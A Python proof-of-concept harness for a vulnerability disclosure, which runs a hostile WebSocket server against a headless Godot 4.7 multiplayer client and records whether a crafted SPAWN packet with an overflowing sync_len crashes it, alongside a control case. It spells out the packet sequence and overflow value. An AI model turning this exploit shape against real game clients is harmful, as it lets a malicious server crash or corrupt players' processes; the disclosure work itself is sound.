#!/usr/bin/env python3
"""Capture proj/stock_binary_proof.txt: run server + Godot client twice.

  CASE A (overflow):  SPAWN_SYNC_LEN=0x40000000  -> expect SIGSEGV exit 139
  CASE B (control):  SPAWN_SYNC_LEN=0x10000000  -> expect clean exit 3, no crash

CASE B proves the crash in CASE A is caused by the uint32 overflow specifically,
not by any other aspect of the packet.

Usage:  python capture_proof.py    (env LISTEN_PORT optional, default 49300)
"""
import os, subprocess, sys, time, signal

ROOT = os.path.dirname(os.path.abspath(__file__))
GODOT = os.environ.get("GODOT", "godot")
PORT = os.environ.get("LISTEN_PORT", "49300")


def run_case(sync_len):
    env = dict(os.environ)
    env.update(SPAWN_SYNC_LEN=sync_len, LISTEN_PORT=PORT, PYTHONUNBUFFERED="1")
    srv = subprocess.Popen([sys.executable, "-u", os.path.join(ROOT, "server.py")],
                           cwd=ROOT, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(1.5)
    t0 = time.time()
    try:
        client = subprocess.run(
            [GODOT, "--headless", "--path", os.path.join(ROOT, "proj"),
             "--script", "res://victim_client.gd"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=45,
            env={**env, "LISTEN_PORT": PORT})
    except subprocess.TimeoutExpired:
        client = type("C", (), {"stdout": "<timeout>", "returncode": -1})()
    elapsed = time.time() - t0
    srv.send_signal(signal.SIGTERM)
    try:
        srv_out = srv.stdout.read().decode("utf-8", "replace")
    except Exception:
        srv_out = ""
    try:
        srv.wait(timeout=3)
    except subprocess.TimeoutExpired:
        srv.kill()
    return client.returncode, elapsed, srv_out, client.stdout


def main():
    L = []
    L.append("# Stock-binary proof — SceneReplicationInterface::on_spawn_receive")
    L.append("# integer-overflow / OOB read (disclosure 006)")
    L.append("")
    L.append("Engine : Godot v4.7.stable.official.5b4e0cb0f")
    L.append(f"Binary : {GODOT}")
    import time as _t
    L.append("Date  : " + _t.strftime("%Y-%m-%d"))
    L.append("")
    L.append("Note: the 'rpc node checksum failed' error below is expected and benign:")
    L.append("process_simplify_path still caches the node (scene_cache_interface.cpp:126-128);")
    L.append("it only affects the advisory md5 echo, not the path registration the SPAWN needs.")
    L.append("")
    L.append("Demo shape: a malicious WebSocket server (server.py) pops a Godot 4.7")
    L.append("multiplayer CLIENT that connected to it. No file, no @tool, no autoload")
    L.append("beyond victim_client.gd. The server sends 3 binary WS frames: a 4-byte")
    L.append("peer id, a NETWORK_COMMAND_SIMPLIFY_PATH (caches the client's spawner),")
    L.append("then ONE crafted NETWORK_COMMAND_SPAWN whose sync_len overflows the")
    L.append("bounds check in on_spawn_receive.")
    L.append("")
    L.append("=" * 70)
    L.append("CASE A — overflow:  sync_len = 0x40000000  (sync_len*4 wraps to 0 in uint32)")
    L.append("=" * 70)
    rc, el, srv, cli = run_case("0x40000000")
    L.append(f"Client exit code : {rc}   (139 / 0xC0000005 = SIGSEGV / ACCESS_VIOLATION)")
    L.append(f"Elapsed          : {el:.2f}s")
    L.append("")
    L.append("--- server.py output ---")
    L.append(srv.rstrip())
    L.append("")
    L.append("--- Godot victim client output ---")
    L.append(cli.rstrip())
    L.append("")
    L.append("=" * 70)
    L.append("CASE B — control:  sync_len = 0x10000000  (sync_len*4 = 0x40000000, NO overflow)")
    L.append("=" * 70)
    L.append("With no overflow, the bounds check in on_spawn_receive correctly rejects")
    L.append("the packet and the client disconnects cleanly. This proves the crash in")
    L.append("CASE A is specifically caused by the uint32 overflow defeating the check,")
    L.append("not by any other aspect of the packet.")
    L.append("")
    rc2, el2, srv2, cli2 = run_case("0x10000000")
    L.append(f"Client exit code : {rc2}   (3 = clean disconnect, no crash)")
    L.append(f"Elapsed          : {el2:.2f}s")
    L.append("")
    L.append("--- server.py output ---")
    L.append(srv2.rstrip())
    L.append("")
    L.append("--- Godot victim client output (key lines) ---")
    for ln in cli2.splitlines():
        if ("spawner path" in ln or "checksum" in ln or "Invalid spawn packet" in ln
                or "!! " in ln or "CrashHandler" in ln or "signal" in ln):
            L.append(ln)
    if not any("!! " in ln or "CrashHandler" in ln for ln in cli2.splitlines()):
        L.append(cli2.rstrip())
    out = "\n".join(L) + "\n"
    path = os.path.join(ROOT, "proj", "stock_binary_proof.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write(out)
    print(f"Wrote {path}")
    print(f"CASE A exit={rc} ({el:.1f}s)  CASE B exit={rc2} ({el2:.1f}s)")


if __name__ == "__main__":
    main()
